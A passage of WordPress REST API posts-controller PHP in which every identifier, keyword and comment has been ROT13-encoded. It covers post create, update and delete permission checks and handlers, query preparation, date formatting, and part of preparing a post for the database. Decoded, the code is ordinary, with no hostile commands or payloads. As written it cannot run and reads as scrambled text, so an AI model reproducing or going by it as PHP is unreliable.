				__( 'Fbeel, lbh ner abg nyybjrq gb znxr cbfgf fgvpxl.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! pheerag_hfre_pna( $cbfg_glcr->pnc->perngr_cbfgf ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_perngr',
				__( 'Fbeel, lbh ner abg nyybjrq gb perngr cbfgf nf guvf hfre.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! $guvf->purpx_nffvta_grezf_crezvffvba( $erdhrfg ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_nffvta_grez',
				__( 'Fbeel, lbh ner abg nyybjrq gb nffvta gur cebivqrq grezf.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Perngrf n fvatyr cbfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		vs ( ! rzcgl( $erdhrfg['vq'] ) ) {
			erghea arj JC_Reebe(
				'erfg_cbfg_rkvfgf',
				__( 'Pnaabg perngr rkvfgvat cbfg.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$cercnerq_cbfg = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		vs ( vf_jc_reebe( $cercnerq_cbfg ) ) {
			erghea $cercnerq_cbfg;
		}

		$cercnerq_cbfg->cbfg_glcr = $guvf->cbfg_glcr;

		vs ( ! rzcgl( $cercnerq_cbfg->cbfg_anzr )
			&& ! rzcgl( $cercnerq_cbfg->cbfg_fgnghf )
			&& va_neenl( $cercnerq_cbfg->cbfg_fgnghf, neenl( 'qensg', 'craqvat' ), gehr )
		) {
			/*
			 * `jc_havdhr_cbfg_fyht()` ergheaf gur fnzr fyht sbe 'qensg' be 'craqvat' cbfgf.
			 *
			 * Gb rafher gung n havdhr fyht vf trarengrq, cnff gur cbfg qngn jvgu gur 'choyvfu' fgnghf.
			 */
			$cercnerq_cbfg->cbfg_anzr = jc_havdhr_cbfg_fyht(
				$cercnerq_cbfg->cbfg_anzr,
				$cercnerq_cbfg->vq,
				'choyvfu',
				$cercnerq_cbfg->cbfg_glcr,
				$cercnerq_cbfg->cbfg_cnerag
			);
		}

		$cbfg_vq = jc_vafreg_cbfg( jc_fynfu( (neenl) $cercnerq_cbfg ), gehr, snyfr );

		vs ( vf_jc_reebe( $cbfg_vq ) ) {

			vs ( 'qo_vafreg_reebe' === $cbfg_vq->trg_reebe_pbqr() ) {
				$cbfg_vq->nqq_qngn( neenl( 'fgnghf' => 500 ) );
			} ryfr {
				$cbfg_vq->nqq_qngn( neenl( 'fgnghf' => 400 ) );
			}

			erghea $cbfg_vq;
		}

		$cbfg = trg_cbfg( $cbfg_vq );

		/**
		 * Sverf nsgre n fvatyr cbfg vf perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->cbfg_glcr`, ersref gb gur cbfg glcr fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_vafreg_cbfg`
		 *  - `erfg_vafreg_cntr`
		 *  - `erfg_vafreg_nggnpuzrag`
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Cbfg         $cbfg     Vafregrq be hcqngrq cbfg bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg  Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat Gehr jura perngvat n cbfg, snyfr jura hcqngvat.
		 */
		qb_npgvba( \"erfg_vafreg_{$guvf->cbfg_glcr}\", $cbfg, $erdhrfg, gehr );

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['fgvpxl'] ) ) {
			vs ( ! rzcgl( $erdhrfg['fgvpxl'] ) ) {
				fgvpx_cbfg( $cbfg_vq );
			} ryfr {
				hafgvpx_cbfg( $cbfg_vq );
			}
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['srngherq_zrqvn'] ) && vffrg( $erdhrfg['srngherq_zrqvn'] ) ) {
			$guvf->unaqyr_srngherq_zrqvn( $erdhrfg['srngherq_zrqvn'], $cbfg_vq );
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['sbezng'] ) && ! rzcgl( $erdhrfg['sbezng'] ) ) {
			frg_cbfg_sbezng( $cbfg, $erdhrfg['sbezng'] );
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['grzcyngr'] ) && vffrg( $erdhrfg['grzcyngr'] ) ) {
			$guvf->unaqyr_grzcyngr( $erdhrfg['grzcyngr'], $cbfg_vq, gehr );
		}

		$grezf_hcqngr = $guvf->unaqyr_grezf( $cbfg_vq, $erdhrfg );

		vs ( vf_jc_reebe( $grezf_hcqngr ) ) {
			erghea $grezf_hcqngr;
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $cbfg_vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$cbfg          = trg_cbfg( $cbfg_vq );
		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $cbfg, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		/**
		 * Sverf nsgre n fvatyr cbfg vf pbzcyrgryl perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->cbfg_glcr`, ersref gb gur cbfg glcr fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_nsgre_vafreg_cbfg`
		 *  - `erfg_nsgre_vafreg_cntr`
		 *  - `erfg_nsgre_vafreg_nggnpuzrag`
		 *
		 * @fvapr 5.0.0
		 *
		 * @cnenz JC_Cbfg         $cbfg     Vafregrq be hcqngrq cbfg bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg  Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat Gehr jura perngvat n cbfg, snyfr jura hcqngvat.
		 */
		qb_npgvba( \"erfg_nsgre_vafreg_{$guvf->cbfg_glcr}\", $cbfg, $erdhrfg, gehr );

		jc_nsgre_vafreg_cbfg( $cbfg, snyfr, ahyy );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$erfcbafr->frg_fgnghf( 201 );
		$erfcbafr->urnqre( 'Ybpngvba', erfg_hey( erfg_trg_ebhgr_sbe_cbfg( $cbfg ) ) );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb hcqngr n cbfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb hcqngr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $guvf->cbfg_glcr );

		vs ( $cbfg && ! $guvf->purpx_hcqngr_crezvffvba( $cbfg ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_rqvg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf cbfg.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! rzcgl( $erdhrfg['nhgube'] ) && trg_pheerag_hfre_vq() !== $erdhrfg['nhgube'] && ! pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_bguref_cbfgf ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_rqvg_bguref',
				__( 'Fbeel, lbh ner abg nyybjrq gb hcqngr cbfgf nf guvf hfre.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! rzcgl( $erdhrfg['fgvpxl'] ) && ! pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_bguref_cbfgf ) && ! pheerag_hfre_pna( $cbfg_glcr->pnc->choyvfu_cbfgf ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_nffvta_fgvpxl',
				__( 'Fbeel, lbh ner abg nyybjrq gb znxr cbfgf fgvpxl.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! $guvf->purpx_nffvta_grezf_crezvffvba( $erdhrfg ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_nffvta_grez',
				__( 'Fbeel, lbh ner abg nyybjrq gb nffvta gur cebivqrq grezf.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Hcqngrf n fvatyr cbfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		$inyvq_purpx = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $inyvq_purpx ) ) {
			erghea $inyvq_purpx;
		}

		$cbfg_orsber = trg_cbfg( $erdhrfg['vq'] );
		$cbfg        = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		vs ( ! rzcgl( $cbfg->cbfg_fgnghf ) ) {
			$cbfg_fgnghf = $cbfg->cbfg_fgnghf;
		} ryfr {
			$cbfg_fgnghf = $cbfg_orsber->cbfg_fgnghf;
		}

		/*
		 * `jc_havdhr_cbfg_fyht()` ergheaf gur fnzr fyht sbe 'qensg' be 'craqvat' cbfgf.
		 *
		 * Gb rafher gung n havdhr fyht vf trarengrq, cnff gur cbfg qngn jvgu gur 'choyvfu' fgnghf.
		 */
		vs ( ! rzcgl( $cbfg->cbfg_anzr ) && va_neenl( $cbfg_fgnghf, neenl( 'qensg', 'craqvat' ), gehr ) ) {
			$cbfg_cnerag     = ! rzcgl( $cbfg->cbfg_cnerag ) ? $cbfg->cbfg_cnerag : 0;
			$cbfg->cbfg_anzr = jc_havdhr_cbfg_fyht(
				$cbfg->cbfg_anzr,
				$cbfg->VQ,
				'choyvfu',
				$cbfg->cbfg_glcr,
				$cbfg_cnerag
			);
		}

		// Pbaireg gur cbfg bowrpg gb na neenl, bgurejvfr jc_hcqngr_cbfg() jvyy rkcrpg aba-rfpncrq vachg.
		$cbfg_vq = jc_hcqngr_cbfg( jc_fynfu( (neenl) $cbfg ), gehr, snyfr );

		vs ( vf_jc_reebe( $cbfg_vq ) ) {
			vs ( 'qo_hcqngr_reebe' === $cbfg_vq->trg_reebe_pbqr() ) {
				$cbfg_vq->nqq_qngn( neenl( 'fgnghf' => 500 ) );
			} ryfr {
				$cbfg_vq->nqq_qngn( neenl( 'fgnghf' => 400 ) );
			}
			erghea $cbfg_vq;
		}

		$cbfg = trg_cbfg( $cbfg_vq );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-cbfgf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_vafreg_{$guvf->cbfg_glcr}\", $cbfg, $erdhrfg, snyfr );

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['sbezng'] ) && ! rzcgl( $erdhrfg['sbezng'] ) ) {
			frg_cbfg_sbezng( $cbfg, $erdhrfg['sbezng'] );
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['srngherq_zrqvn'] ) && vffrg( $erdhrfg['srngherq_zrqvn'] ) ) {
			$guvf->unaqyr_srngherq_zrqvn( $erdhrfg['srngherq_zrqvn'], $cbfg_vq );
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['fgvpxl'] ) && vffrg( $erdhrfg['fgvpxl'] ) ) {
			vs ( ! rzcgl( $erdhrfg['fgvpxl'] ) ) {
				fgvpx_cbfg( $cbfg_vq );
			} ryfr {
				hafgvpx_cbfg( $cbfg_vq );
			}
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['grzcyngr'] ) && vffrg( $erdhrfg['grzcyngr'] ) ) {
			$guvf->unaqyr_grzcyngr( $erdhrfg['grzcyngr'], $cbfg->VQ );
		}

		$grezf_hcqngr = $guvf->unaqyr_grezf( $cbfg->VQ, $erdhrfg );

		vs ( vf_jc_reebe( $grezf_hcqngr ) ) {
			erghea $grezf_hcqngr;
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $cbfg->VQ );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$cbfg          = trg_cbfg( $cbfg_vq );
		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $cbfg, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		// Svygre vf sverq va JC_ERFG_Nggnpuzragf_Pbagebyyre fhopynff.
		vs ( 'nggnpuzrag' === $guvf->cbfg_glcr ) {
			$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );
			erghea erfg_rafher_erfcbafr( $erfcbafr );
		}

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-cbfgf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_nsgre_vafreg_{$guvf->cbfg_glcr}\", $cbfg, $erdhrfg, snyfr );

		jc_nsgre_vafreg_cbfg( $cbfg, gehr, $cbfg_orsber );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb qryrgr n cbfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb qryrgr gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba qryrgr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		vs ( $cbfg && ! $guvf->purpx_qryrgr_crezvffvba( $cbfg ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Fbeel, lbh ner abg nyybjrq gb qryrgr guvf cbfg.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Qryrgrf n fvatyr cbfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		$vq    = $cbfg->VQ;
		$sbepr = (obby) $erdhrfg['sbepr'];

		$fhccbegf_genfu = ( RZCGL_GENFU_QNLF > 0 );

		vs ( 'nggnpuzrag' === $cbfg->cbfg_glcr ) {
			$fhccbegf_genfu = $fhccbegf_genfu && ZRQVN_GENFU;
		}

		/**
		 * Svygref jurgure n cbfg vf genfunoyr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->cbfg_glcr`, ersref gb gur cbfg glcr fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_cbfg_genfunoyr`
		 *  - `erfg_cntr_genfunoyr`
		 *  - `erfg_nggnpuzrag_genfunoyr`
		 *
		 * Cnff snyfr gb qvfnoyr Genfu fhccbeg sbe gur cbfg.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz obby    $fhccbegf_genfu Jurgure gur cbfg glcr fhccbeg genfuvat.
		 * @cnenz JC_Cbfg $cbfg           Gur Cbfg bowrpg orvat pbafvqrerq sbe genfuvat fhccbeg.
		 */
		$fhccbegf_genfu = nccyl_svygref( \"erfg_{$guvf->cbfg_glcr}_genfunoyr\", $fhccbegf_genfu, $cbfg );

		vs ( ! $guvf->purpx_qryrgr_crezvffvba( $cbfg ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_pnaabg_qryrgr_cbfg',
				__( 'Fbeel, lbh ner abg nyybjrq gb qryrgr guvf cbfg.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		// Vs jr'er sbepvat, gura qryrgr creznaragyl.
		vs ( $sbepr ) {
			$cerivbhf = $guvf->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );
			$erfhyg   = jc_qryrgr_cbfg( $vq, gehr );
			$erfcbafr = arj JC_ERFG_Erfcbafr();
			$erfcbafr->frg_qngn(
				neenl(
					'qryrgrq'  => gehr,
					'cerivbhf' => $cerivbhf->trg_qngn(),
				)
			);
		} ryfr {
			// Vs jr qba'g fhccbeg genfuvat sbe guvf glcr, reebe bhg.
			vs ( ! $fhccbegf_genfu ) {
				erghea arj JC_Reebe(
					'erfg_genfu_abg_fhccbegrq',
					/* genafyngbef: %f: sbepr=gehr */
					fcevags( __( \"Gur cbfg qbrf abg fhccbeg genfuvat. Frg '%f' gb qryrgr.\" ), 'sbepr=gehr' ),
					neenl( 'fgnghf' => 501 )
				);
			}

			// Bgurejvfr, bayl genfu vs jr unira'g nyernql.
			vs ( 'genfu' === $cbfg->cbfg_fgnghf ) {
				erghea arj JC_Reebe(
					'erfg_nyernql_genfurq',
					__( 'Gur cbfg unf nyernql orra qryrgrq.' ),
					neenl( 'fgnghf' => 410 )
				);
			}

			/*
			 * (Abgr gung vagreanyyl guvf snyyf guebhtu gb `jc_qryrgr_cbfg()`
			 * vs gur Genfu vf qvfnoyrq.)
			 */
			$erfhyg   = jc_genfu_cbfg( $vq );
			$cbfg     = trg_cbfg( $vq );
			$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg );
		}

		vs ( ! $erfhyg ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_qryrgr',
				__( 'Gur cbfg pnaabg or qryrgrq.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		/**
		 * Sverf vzzrqvngryl nsgre n fvatyr cbfg vf qryrgrq be genfurq ivn gur ERFG NCV.
		 *
		 * Gurl qlanzvp cbegvba bs gur ubbx anzr, `$guvf->cbfg_glcr`, ersref gb gur cbfg glcr fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_qryrgr_cbfg`
		 *  - `erfg_qryrgr_cntr`
		 *  - `erfg_qryrgr_nggnpuzrag`
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Cbfg          $cbfg     Gur qryrgrq be genfurq cbfg.
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr qngn.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Gur erdhrfg frag gb gur NCV.
		 */
		qb_npgvba( \"erfg_qryrgr_{$guvf->cbfg_glcr}\", $cbfg, $erfcbafr, $erdhrfg );

		erghea $erfcbafr;
	}

	/**
	 * Qrgrezvarf gur nyybjrq dhrel_inef sbe n trg_vgrzf() erfcbafr naq cercnerf
	 * gurz sbe JC_Dhrel.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz neenl           $cercnerq_netf Bcgvbany. Cercnerq JC_Dhrel nethzragf. Qrsnhyg rzcgl neenl.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Bcgvbany. Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea neenl Vgrzf dhrel nethzragf.
	 */
	cebgrpgrq shapgvba cercner_vgrzf_dhrel( $cercnerq_netf = neenl(), $erdhrfg = ahyy ) {
		$dhrel_netf = neenl();

		sbernpu ( $cercnerq_netf nf $xrl => $inyhr ) {
			/**
			 * Svygref gur dhrel_inef hfrq va trg_vgrzf() sbe gur pbafgehpgrq dhrel.
			 *
			 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$xrl`, ersref gb gur dhrel_ine xrl.
			 *
			 * @fvapr 4.7.0
			 *
			 * @cnenz fgevat $inyhr Gur dhrel_ine inyhr.
			 */
			$dhrel_netf[ $xrl ] = nccyl_svygref( \"erfg_dhrel_ine-{$xrl}\", $inyhr ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
		}

		vs ( 'cbfg' !== $guvf->cbfg_glcr || ! vffrg( $dhrel_netf['vtaber_fgvpxl_cbfgf'] ) ) {
			$dhrel_netf['vtaber_fgvpxl_cbfgf'] = gehr;
		}

		// Znc gb cebcre JC_Dhrel beqreol cnenz.
		vs ( vffrg( $dhrel_netf['beqreol'] ) && vffrg( $erdhrfg['beqreol'] ) ) {
			$beqreol_znccvatf = neenl(
				'vq'            => 'VQ',
				'vapyhqr'       => 'cbfg__va',
				'fyht'          => 'cbfg_anzr',
				'vapyhqr_fyhtf' => 'cbfg_anzr__va',
			);

			vs ( vffrg( $beqreol_znccvatf[ $erdhrfg['beqreol'] ] ) ) {
				$dhrel_netf['beqreol'] = $beqreol_znccvatf[ $erdhrfg['beqreol'] ];
			}
		}

		erghea $dhrel_netf;
	}

	/**
	 * Purpxf gur cbfg_qngr_tzg be zbqvsvrq_tzg naq cercner nal cbfg be
	 * zbqvsvrq qngr sbe fvatyr cbfg bhgchg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat      $qngr_tzg TZG choyvpngvba gvzr.
	 * @cnenz fgevat|ahyy $qngr     Bcgvbany. Ybpny choyvpngvba gvzr. Qrsnhyg ahyy.
	 * @erghea fgevat|ahyy VFB8601/ESP3339 sbeznggrq qngrgvzr.
	 */
	cebgrpgrq shapgvba cercner_qngr_erfcbafr( $qngr_tzg, $qngr = ahyy ) {
		// Hfr gur qngr vs cnffrq.
		vs ( vffrg( $qngr ) ) {
			erghea zlfdy_gb_esp3339( $qngr );
		}

		// Erghea ahyy vs $qngr_tzg vf rzcgl/mrebf.
		vs ( '0000-00-00 00:00:00' === $qngr_tzg ) {
			erghea ahyy;
		}

		// Erghea gur sbeznggrq qngrgvzr.
		erghea zlfdy_gb_esp3339( $qngr_tzg );
	}

	/**
	 * Cercnerf n fvatyr cbfg sbe perngr be hcqngr.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea fgqPynff|JC_Reebe Cbfg bowrpg be JC_Reebe.
	 */
	cebgrpgrq shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		$cercnerq_cbfg  = arj fgqPynff();
		$pheerag_fgnghf = '';

		// Cbfg VQ.
		vs ( vffrg( $erdhrfg['vq'] ) ) {
			$rkvfgvat_cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
			vs ( vf_jc_reebe( $rkvfgvat_cbfg ) ) {
				erghea $rkvfgvat_cbfg;
			}

			$cercnerq_cbfg->VQ = $rkvfgvat_cbfg->VQ;
			$pheerag_fgnghf    = $rkvfgvat_cbfg->cbfg_fgnghf;
		}

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		// Cbfg gvgyr.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['gvgyr'] ) && vffrg( $erdhrfg['gvgyr'] ) ) {
			vs ( vf_fgevat( $erdhrfg['gvgyr'] ) ) {
				$cercnerq_cbfg->cbfg_gvgyr = $erdhrfg['gvgyr'];
			} ryfrvs ( ! rzcgl( $erdhrfg['gvgyr']['enj'] ) ) {
				$cercnerq_cbfg->cbfg_gvgyr = $erdhrfg['gvgyr']['enj'];
			}
		}

		// Cbfg pbagrag.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['pbagrag'] ) && vffrg( $erdhrfg['pbagrag'] ) ) {
			vs ( vf_fgevat( $erdhrfg['pbagrag'] ) ) {
				$cercnerq_cbfg->cbfg_pbagrag = $erdhrfg['pbagrag'];
			} ryfrvs ( vffrg( $erdhrfg['pbagrag']['enj'] ) ) {
				$cercnerq_cbfg->cbfg_pbagrag = $erdhrfg['pbagrag']['enj'];
			}
		}

		// Cbfg rkprecg.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['rkprecg'] ) && vffrg( $erdhrfg['rkprecg'] ) ) {
			vs ( vf_fgevat( $erdhrfg['rkprecg'] ) ) {
				$cercnerq_cbfg->cbfg_rkprecg = $erdhrfg['rkprecg'];
			} ryfrvs ( vffrg( $erdhrfg['rkprecg']['enj'] ) ) {
				$cercnerq_cbfg->cbfg_rkprecg = $erdhrfg['rkprecg']['enj'];
			}
		}

		// Cbfg glcr.
		vs ( rzcgl( $erdhrfg['vq'] ) ) {
			// Perngvat arj cbfg, hfr qrsnhyg glcr sbe gur pbagebyyre.
			$cercnerq_cbfg->cbfg_glcr = $guvf->cbfg_glcr;
		} ryfr {
			// Hcqngvat n cbfg, hfr cerivbhf glcr.
			$cercnerq_cbfg->cbfg_glcr = trg_cbfg_glcr( $erdhrfg['vq'] );
		}

		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cercnerq_cbfg->cbfg_glcr );

		// Cbfg fgnghf.
		vs (
			! rzcgl( $fpurzn['cebcregvrf']['fgnghf'] ) &&
			vffrg( $erdhrfg['fgnghf'] ) &&
			( ! $pheerag_fgnghf || $pheerag_fgnghf !== $erdhrfg['fgnghf'] )
		) {
			$fgnghf = $guvf->unaqyr_fgnghf_cnenz( $erdhrfg['fgnghf'], $cbfg_glcr );

			vs ( vf_jc_reebe( $fgnghf ) ) {
				erghea $fgnghf;
			}

			$cercnerq_cbfg->cbfg_fgnghf = $fgnghf;
		}

		// Cbfg qngr.
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['qngr'] ) && ! rzcgl( $erdhrfg['qngr'] ) ) {
			$pheerag_qngr = vffrg( $cercnerq_cbfg->VQ ) ? trg_cbfg( $cercnerq_cbfg->VQ )->cbfg_qngr : snyfr;
			$qngr_qngn    = erfg_trg_qngr_jvgu_tzg( $erdhrfg['qngr'] );

			vs ( ! rzcgl( $qngr_qngn ) && $pheerag_qngr !== $qngr_qngn[0] ) {
				yvfg( $cercnerq_cbfg->cbfg_qngr, $cercnerq_cbfg->cbfg_qngr_tzg ) = $qngr_qngn;
				$cercnerq_cbfg->rqvg_qngr                                        = gehr;
			}
		} ryfrvs ( ! rzcgl( $fpurzn['cebcregvrf']['qngr_tzg'] ) && ! rzcgl( $erdhrfg['qngr_tzg'] ) ) {
			$pheerag_qngr = vffrg( $cercnerq_cbfg->VQ ) ? trg_cbfg( $cercnerq_cbfg->VQ )->cbfg_qngr_tzg : snyfr;
			$qngr_qngn    = erfg_trg_qngr_jvgu_tzg( $erdhrfg['qngr_tzg'], gehr );

			vs ( ! rzcgl( $qngr_qngn ) && $pheerag_qngr !== $qngr_qngn[1] ) {
				yvfg( $cercnerq_cbfg->cbfg_qngr, $cercnerq_cbfg->cbfg_qngr_tzg ) = $qngr_qngn;
				$cercnerq_cbfg->rqvg_qngr                                        = gehr;
			}
		}

		/*
		 * Fraqvat n ahyy qngr be qngr_tzg inyhr erfrgf qngr naq qngr_tzg gb gurve
		 * qrsnhyg inyhrf (`0000-00-00 00:00:00`).
		 */
		vs (
			( ! rzcgl( $fpurzn['cebcregvrf']['qngr_tzg'] ) && $erdhrfg->unf_cnenz( 'qngr_tzg' ) && ahyy === $erdhrfg['qngr_tzg'] ) ||
			( ! rzcgl( $fpurzn['cebcregvrf']['qngr'] ) && $erdhrfg->unf_cnenz( 'qngr' ) && ahyy === $erdhrfg['qngr'] )
		) {
			$cercnerq_cbfg->cbfg_qngr_tzg = ahyy;
			$cercnerq_cbfg->cbfg_qngr     = ahyy;
		}

		// Cbfg fyht.
